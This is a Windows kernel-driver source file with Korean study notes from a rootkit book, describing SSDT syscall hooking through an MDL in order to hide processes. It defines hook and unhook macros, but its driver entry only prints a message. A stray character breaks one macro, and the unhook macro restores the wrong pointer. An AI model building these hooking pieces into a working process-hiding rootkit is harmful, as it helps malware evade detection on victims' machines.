/*++
    2012. 9. 26
    
    HideProcessHookMDL
    - 루트킷 109p 

    Prerequisite
    - SSDT, KeServiceDescriptorTable(ntoskrnl.exe)
      KeServiceDescriptorTableShadow(win32k.sys, USER,GDI 서비스의 주소)
    - SSDT의 메모리 보호 해제(CR0 Trick or MDL)
      MDL
      1. SSDT의 베이스 주소와 크기를 얻는다
      2. SSDT영역을 표현해주는 MDL을 non-paged pool 메모리 영역에 만든다(MmCreateMdl)
      3. 생성한 MDL 플래그 값을 MDL_MAPPED_TO_SYSTEM_VA값과 OR연산한다
      4. MmMapLockedPages 함수 호출
    - Zw*함수 안의 코드
      Zw*함수의 opcode 시작은 해당 함수의 인덱스 번호를 이용해 동작
      move ax, ULONG   (ULONG은 SSDT에서의 인덱스 번호)
      인덱스 번호는 opcode의 두번째 바이트 부분에 존재
    - InterlockedExchange
    - ZwQuerySystemInformation
       프로세스와 스레드 정보 구하기
       작업관리자는 이 함수를 이용해 프로세스 리스트 정보를 구함(SystemInformationClass, 5)
 --*/

#include "ntddk.h"


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase; //Used only in checked build
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

// ntoskernl.exe에서 제공하는 Zw*함수의 주소를 입력 받아 그에 상응하는 SSDT에서의 Nt*함수의 주소를 얻음
// Zw*함수와 SSDT의 Nt*함수는 일대일 대응 아님
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]ㅍ
// Zw*함수의 주소를 입력 받아 해당 함수의 SSDT에서의 인덱스 번호를 구한다
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
// 
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
    _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
    InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)



VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
    DbgPrint("HideProcessHookMDL OnUnload called\n");
}



NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    DbgPrint("HideProcessHookMDL\n");
    DriverObject->DriverUnload = OnUnload;
    return STATUS_SUCCESS;
}